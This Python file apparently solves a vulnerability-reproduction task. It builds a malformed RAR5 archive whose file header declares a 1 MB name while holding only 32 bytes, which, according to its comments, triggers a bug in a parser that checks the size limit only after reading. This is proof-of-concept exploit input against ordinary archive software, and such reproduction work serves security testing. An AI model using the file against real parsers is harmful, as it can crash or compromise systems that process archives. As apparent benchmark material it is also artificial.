import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def to_varint(n):
            res = bytearray()
            while n > 0x7F:
                res.append((n & 0x7F) | 0x80)
                n >>= 7
            res.append(n)
            return bytes(res)

        def make_block(header_type, header_flags, body_data):
            # Construct the inner content: Type(V) + Flags(V) + Body
            # Note: For simplicity, assuming no Extra Area or Data Size fields based on flags=0
            content = to_varint(header_type) + to_varint(header_flags) + body_data
            
            # The Size field in the block header is the size of the content
            size_bytes = to_varint(len(content))
            
            # The CRC is calculated over the Size field and the content
            crc_payload = size_bytes + content
            crc_val = zlib.crc32(crc_payload) & 0xFFFFFFFF
            
            return struct.pack('<I', crc_val) + crc_payload

        # RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
        
        # 1. Main Archive Header
        # Type: 1 (Main Header)
        # Header Flags: 0
        # Body: Archive Flags (VarInt) -> 0
        mh_body = to_varint(0)
        mh_block = make_block(1, 0, mh_body)
        
        # 2. File Header
        # Type: 2 (File Header)
        # Header Flags: 0 (No extra area, no data size)
        # Body Fields (when FileFlags=0):
        #   File Flags (VarInt)
        #   Unpacked Size (VarInt)
        #   Attributes (VarInt)
        #   Compression Info (VarInt)
        #   Host OS (VarInt)
        #   Name Size (VarInt)
        #   Name (Bytes)
        
        file_flags = 0
        unpacked_size = 0
        attributes = 0
        compression_info = 0
        host_os = 0
        
        # Trigger: Set Name Size to a large value (e.g., 1MB) to trigger allocation
        # but provide less data in the file to trigger error handling logic.
        # The vulnerability description indicates the check for max size happens *after* reading,
        # implying we need to initiate the read sequence with a large size.
        name_size = 1048576 # 1MB
        
        # Provide minimal actual name data
        name_data = b'A' * 32
        
        fh_fields = (
            to_varint(file_flags) +
            to_varint(unpacked_size) +
            to_varint(attributes) +
            to_varint(compression_info) +
            to_varint(host_os) +
            to_varint(name_size)
        )
        
        fh_body = fh_fields + name_data
        fh_block = make_block(2, 0, fh_body)
        
        return sig + mh_block + fh_block